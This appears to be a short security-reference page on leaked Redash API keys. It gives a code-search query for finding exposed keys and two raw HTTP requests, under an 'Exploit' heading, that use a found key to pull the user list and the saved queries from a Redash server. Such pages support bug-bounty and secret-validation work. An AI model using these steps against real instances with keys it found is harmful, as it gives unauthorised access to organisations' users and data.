---
description: >-
  Redash is used for data visualization and collaboration, primarily in the
  context of business intelligence and data analytics.
---

# Redash Apikey

### Search

```
redash AND api/queries AND Authorization
```

### Exploit

Get user

```
GET /api/users HTTP/1.1
Host: redash.host.com
Authorization: Key {key}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0


```

Get list query

```
GET /api/queries HTTP/1.1
Host: redash.host.com
Authorization: Key {key}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0


```
